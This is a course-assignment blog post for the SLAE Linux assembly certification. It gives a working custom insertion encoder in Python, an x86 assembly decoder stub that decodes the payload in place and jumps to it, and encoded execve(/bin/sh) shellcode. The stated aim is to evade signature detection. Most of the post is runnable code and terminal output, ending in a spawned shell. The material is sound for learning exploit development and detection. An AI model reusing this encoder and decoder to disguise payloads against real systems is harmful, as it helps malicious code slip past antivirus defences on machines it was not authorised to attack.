---
title:  "[SLAE] Assignment 4 - Custom Encoding Scheme"
---

![Logo](/assets/images/tux-root.png)

## Custom encoding scheme
For the 4th assignment of [SLAE](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/), I've made a custom encoding scheme, with the same purpose as the insertion encoder: *__avoid signature detection by inserting garbage bytes into the shellcode__*.

 The encoding scheme is as follows: we start from a working shellcode and insert garbage blocks, containing a random garbage byte and the offset to the next garbage block.
The distance between the garbage blocks is a random value between 2 modifiable limits. In this way we can control the final length of the shellcode and the amount of garbage inserted:

The encoded shellcode will look like this:
---------------------------------------------------------
| n0 | . . .| b1 | n1 | . . . . .| b2 | n2 | . . . |END |
---------------------------------------------------------

ni  - next garbage byte position
bi  - garbage byte 
END - END of the shellcode marker

 The encoding is done in a short python script:
?
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
#!/usr/bin/python
'''
    Python Insertion Encoder 
  
'''
 
import random
 
# Execve-stack shellcode - execve(/bin/sh,..)
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
 
encoded = ""
 
idx = 1
 
# Control  the frequency of garbage through a displacement
MIN_DEP = 3     # min number of shellcode bytes after which to inject garbage
MAX_DEP = 4     # max ...
dep = random.randint(MIN_DEP, MAX_DEP)
n = idx + dep
encoded += '\\x%02x' % n
END = "\\xf0\\x0d"
 
for x in bytearray(shellcode) :
    if idx == n: 
        # We have reached an insertion point
        dep = random.randint(MIN_DEP, MAX_DEP)
        n = idx + dep
 
        encoded += '\\x%02x' % random.randint(1,255)
        encoded += '\\x%02x' % n
        idx += 2
     
    # Add a shellcode byte
    encoded += '\\x%02x' % x
    idx += 1
 
encoded += END
 
print encoded
# Print in nasm friendly form
print encoded.replace("\\x", ",0x")[1:]
 
print 'Initial len: %d, encoded len: %d' % (len(shellcode), 
    len(encoded)/4)
The decoding is done in the assembly shellcode: 
global _start   

section .text
_start:

 jmp short call_shellcode

decoder:
 pop esi                     ; beginning of the encoded shellcode
 lea edi, [esi]              ; shellcode decoded in place. Edi - dest pointer
 xor eax, eax            
 mov al, byte [esi]          ; position of next garbage byte
 xor ebx, ebx
    push 1                      ; index into the shellcode
    pop ecx

decode: 
    cmp ecx, eax
    jnz short shellcode_byte    ; shellcode byte found 
    add ecx, 2                  ; garbage byte found. Advance 2 bytes
    mov al, byte [esi + eax + 1]; position of next garbage byte    
shellcode_byte:                 ; byte part of real shellcode
 mov bl, byte [esi + ecx]
 mov byte [edi], bl
 inc edi                     ; advance destination
 inc ecx                     ; advance source
 cmp byte [esi + ecx], 0xf0  ; check for END marker
    jnz decode
    cmp byte [esi + ecx + 1], 0x0d
    jnz decode
    jmp esi                     ; shellcode decoded in-place. Jump to it



call_shellcode:

 call decoder
 EncodedShellcode: db 0x04,0x31,0xc0,0x50,0x06,0x08,0x68,0x2f,0x15,0x0b,0x2f,0x12,0x0e,0x73,0x85,0x11,0x68,0x4e,0x14,0x68,0x96,0x18,0x2f,0x62,0xd8,0x1c,0x69,0x6e,0xf9,0x20,0x89,0xe3,0xa9,0x23,0x50,0x6d,0x26,0x89,0x60,0x29,0xe2,0x0e,0x2d,0x53,0x89,0x3b,0x30,0xe1,0xaa,0x34,0xb0,0x0b,0x55,0x37,0xcd,0xe2,0x3b,0x80,0xf0,0x0d

And now to test this:
- encode the execve-stack shellcode using the python script
- disassemble and examine the encoded shellcode
- define the shellcode bytes at the end of the assembly decoder
- assemble
- test using a C program which executes the payload 
?
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
$ ./custom-encoder.py 
\x05\x31\xc0\x50\x68\xb1\x08\x2f\x58\x0c\x2f\x73\x71\x10\x68\x68\x88\x14\x2f\x62\x42\x17\x69\x6a\x1a\x6e\xba\x1d\x89\xf5\x21\xe3\x50\xe0\x25\x89\xe2\xaf\x29\x53\x89\x83\x2d\xe1\xb0\x33\x30\x0b\x1a\x33\xcd\x66\x36\x80\xf0\x0d
0x05,0x31,0xc0,0x50,0x68,0xb1,0x08,0x2f,0x58,0x0c,0x2f,0x73,0x71,0x10,0x68,0x68,0x88,0x14,0x2f,0x62,0x42,0x17,0x69,0x6a,0x1a,0x6e,0xba,0x1d,0x89,0xf5,0x21,0xe3,0x50,0xe0,0x25,0x89,0xe2,0xaf,0x29,0x53,0x89,0x83,0x2d,0xe1,0xb0,0x33,0x30,0x0b,0x1a,0x33,0xcd,0x66,0x36,0x80,0xf0,0x0d
Initial len: 25, encoded len: 56
$ echo -ne "\x05\x31\xc0\x50\x68\xb1\x08\x2f\x58\x0c\x2f\x73\x71\x10\x68\x68\x88\x14\x2f\x62\x42\x17\x69\x6a\x1a\x6e\xba\x1d\x89\xf5\x21\xe3\x50\xe0\x25\x89\xe2\xaf\x29\x53\x89\x83\x2d\xe1\xb0\x33\x30\x0b\x1a\x33\xcd\x66\x36\x80\xf0\x0d" | ndisasm -b 32 -
00000000  0531C05068        add eax,0x6850c031
00000005  B108              mov cl,0x8
00000007  2F                das
00000008  58                pop eax
00000009  0C2F              or al,0x2f
0000000B  7371              jnc 0x7e
0000000D  106868            adc [eax+0x68],ch
00000010  88142F            mov [edi+ebp],dl
00000013  624217            bound eax,[edx+0x17]
00000016  696A1A6EBA1D89    imul ebp,[edx+0x1a],dword 0x891dba6e
0000001D  F5                cmc
0000001E  21E3              and ebx,esp
00000020  50                push eax
00000021  E025              loopne 0x48
00000023  89E2              mov edx,esp
00000025  AF                scasd
00000026  295389            sub [ebx-0x77],edx
00000029  832DE1B033300B    sub dword [dword 0x3033b0e1],byte +0xb
00000030  1A33              sbb dh,[ebx]
00000032  CD66              int 0x66
00000034  3680F00D          ss xor al,0xd
$ ./compile.sh 
  [+] Assembling egghunter
  [+] Linking egghunter
\xeb\x2d\x5e\x8d\x3e\x31\xc0\x8a\x06\x31\xdb\x6a\x01\x59\x39\xc1\x75\x07\x83\xc1\x02\x8a\x44\x06\x01\x8a\x1c\x0e\x88\x1f\x47\x41\x80\x3c\x0e\xf0\x75\xe8\x80\x7c\x0e\x01\x0d\x75\xe1\xff\xe6\xe8\xce\xff\xff\xff\x04\x31\xc0\x50\x06\x08\x68\x2f\x15\x0b\x2f\x12\x0e\x73\x85\x11\x68\x4e\x14\x68\x96\x18\x2f\x62\xd8\x1c\x69\x6e\xf9\x20\x89\xe3\xa9\x23\x50\x6d\x26\x89\x60\x29\xe2\x0e\x2d\x53\x89\x3b\x30\xe1\xaa\x34\xb0\x0b\x55\x37\xcd\xe2\x3b\x80\xf0\x0d
  [+] House cleaning
  [+] Done!
$ ./shellcode
Shellcode Length:  112 bytes
$ whoami
liv
$

The complete source files and scripts mentioned in this post can be found in the Git repository:
SLAE

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:        
www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/    
Student ID: SLAE- 449     
Posted by Liviu at 6:49 PM     
Email This
BlogThis!
Share to Twitter
Share to Facebook
Share to Pinterest
